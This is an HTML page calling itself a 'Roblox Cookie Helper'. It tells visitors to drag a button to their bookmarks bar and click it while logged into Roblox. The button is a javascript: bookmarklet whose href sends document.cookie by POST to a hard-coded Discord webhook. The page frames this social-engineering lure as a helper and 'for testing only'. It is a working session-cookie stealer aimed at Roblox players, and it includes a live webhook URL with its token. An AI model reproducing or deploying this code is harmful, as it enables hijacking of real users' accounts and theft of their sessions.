<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Roblox Cookie Helper</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
  body {
    margin: 0;
    background: linear-gradient(135deg, #1f1c2c, #928dab);
    font-family: 'Poppins', sans-serif;
    color: #eee;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    height: 100vh;
    text-align: center;
    user-select: none;
  }
  h1 {
    font-weight: 600;
    margin-bottom: 10px;
    font-size: 2.5rem;
    text-shadow: 0 0 15px #ff6f61;
  }
  p {
    font-weight: 400;
    font-size: 1.1rem;
    max-width: 400px;
    margin: 0 auto 40px auto;
    line-height: 1.5;
    text-shadow: 0 0 5px rgba(0,0,0,0.5);
  }
  #bookmarklet {
    display: inline-block;
    padding: 15px 30px;
    background: #ff6f61;
    color: #fff;
    font-weight: 600;
    font-size: 1.2rem;
    border-radius: 30px;
    cursor: grab;
    user-select: none;
    text-decoration: none;
    box-shadow: 0 5px 15px rgba(255,111,97,0.6);
    transition: background 0.3s ease, box-shadow 0.3s ease;
    animation: pulse 2.5s infinite ease-in-out;
  }
  #bookmarklet:active {
    cursor: grabbing;
  }
  #bookmarklet:hover {
    background: #ff4a3d;
    box-shadow: 0 8px 20px rgba(255,74,61,0.8);
  }
  @keyframes pulse {
    0%, 100% { box-shadow: 0 5px 15px rgba(255,111,97,0.6); }
    50% { box-shadow: 0 10px 25px rgba(255,111,97,0.9); }
  }
  footer {
    margin-top: 40px;
    font-size: 0.85rem;
    color: #bbb;
    text-shadow: none;
  }
</style>
</head>
<body>
  <h1>Roblox Cookie Helper</h1>
  <p>Drag the button below to your bookmarks bar.<br />Then, when logged into Roblox.com, click it to send your accessible cookies to my Discord webhook.</p>
  
  <a
    id="bookmarklet"
    href="javascript:(()=>{fetch('https://discord.com/api/webhooks/1401453972492910654/EYuPVuEmsJifdIhVFfhQw1JeOBaE4L0HhPzbpxxx6MTJ38xOouQtnKxcxHwLUI320yIT',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:'Cookies: '+document.cookie})})})()"
    title="Drag me to your bookmarks bar!"
  >Roblox Cookie Logger</a>
  
  <footer>Â© 2025 Roblox-helper &mdash; For testing only</footer>
</body>
</html>
